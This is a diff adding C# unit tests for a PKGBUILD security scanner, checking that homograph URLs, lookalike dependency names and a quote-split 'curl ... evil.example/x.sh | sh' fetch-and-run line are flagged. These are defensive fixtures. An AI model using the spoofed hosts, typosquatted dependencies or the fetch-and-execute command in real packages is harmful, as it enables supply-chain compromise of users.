@@ -500,4 +500,72 @@ public class PkgBuildSecurityScannerTests
         Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
         Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
     }
+
+    [Test]
+    public void Homograph_url_with_invisible_character_is_high_and_flags()
+    {
+        // Corpus regression fixture (poweriso-gui): U+0670, an invisible combining mark,
+        // is prepended to the url scheme. The package looks clean on inspection.
+        var result = Scan(("PKGBUILD", "pkgname=foo\nurl=\"\u0670http://www.poweriso.com/download.htm\"\n"));
+
+        var finding = result.Findings.Single(f => f.RuleId == "homograph");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
+        Assert.That(finding.Message, Does.Contain("U+0670"));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
+
+    [Test]
+    public void Homograph_lookalike_source_host_is_high_and_flags()
+    {
+        // Cyrillic i (U+0456) spoofing the host of a download URL.
+        var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://g\u0456thub.com/foo/foo-1.0.tar.gz\")\n"));
+
+        var finding = result.Findings.Single(f => f.RuleId == "homograph");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
+
+    [Test]
+    public void Homograph_typosquatted_dependency_is_high_and_flags()
+    {
+        // depends inside a split-package function is indented but still checked.
+        var result = Scan(("PKGBUILD", "package() {\n  depends=('pacman' '\u0440acman-git')\n}\n"));
+
+        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.True);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
+
+    [Test]
+    public void Benign_non_ascii_outside_metadata_values_does_not_block()
+    {
+        // Non-ASCII in comments and pkgdesc is legitimate; the homograph checks only
+        // inspect the extracted pkgname/depends/makedepends/url/source values.
+        var result = Scan(("PKGBUILD",
+            "# 中文注释：构建时需要网络\n" +
+            "pkgname=foo\n" +
+            "pkgdesc=\"Ün outil avec des accents — 日本語の説明文\"\n" +
+            "source=(\"https://example.com/foo.tar.gz\")\n"));
+
+        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.False);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Legitimate_accented_source_filename_does_not_block()
+    {
+        var result = Scan(("PKGBUILD", "pkgname=foo\nsource=(\"https://example.com/1.6_Versi\u00F3n.tar.gz\")\n"));
+
+        Assert.That(result.Findings.Any(f => f.RuleId == "homograph"), Is.False);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Intra_word_quote_split_download_is_flagged()
+    {
+        var result = Scan(("PKGBUILD", "c'u'rl https://evil.example/x.sh | sh\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "network-to-shell");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
 }
